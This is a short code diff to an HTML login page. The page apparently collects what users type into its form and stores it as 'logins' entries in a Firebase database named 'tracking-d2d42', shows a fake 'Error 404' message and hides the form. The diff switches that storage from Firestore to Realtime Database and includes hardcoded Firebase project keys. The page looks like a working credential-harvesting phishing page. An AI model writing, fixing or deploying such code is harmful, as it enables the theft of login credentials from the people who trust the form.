@@ -68,7 +68,7 @@
         }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
     <div class="login-box" id="loginBox">
@@ -83,7 +83,7 @@
         <div class="error-message" id="errorMessage">Error 404</div>
     </div>
     <script>
-        // Firebase configuration (replace with your own if you create a new Firebase project)
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
             authDomain: "tracking-d2d42.firebaseapp.com",
@@ -91,10 +91,11 @@
             storageBucket: "tracking-d2d42.firebasestorage.app",
             messagingSenderId: "411030031665",
             appId: "1:411030031665:web:b79f56ad363c8a7b6d3410",
-            measurementId: "G-QB5KNP29EJ"
+            measurementId: "G-QB5KNP29EJ",
+            databaseURL: "https://tracking-d2d42-default-rtdb.firebaseio.com/"
         };
         const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        const db = firebase.database();
 
         document.getElementById('loginForm').onsubmit = async function(e) {
             e.preventDefault();
@@ -178,10 +179,12 @@
             console.log('Sending:', payload);
 
             try {
-                await db.collection('logins').add(payload);
-                console.log('Data successfully sent to Firestore');
+                // Save to Realtime Database under 'logins' node with a unique key
+                const newLoginRef = db.ref('logins').push();
+                await newLoginRef.set(payload);
+                console.log('Data successfully sent to Realtime Database');
             } catch (error) {
-                console.error('Firestore error:', error.message);
+                console.error('Realtime Database error:', error.message);
             }
 
             // Hide the login form
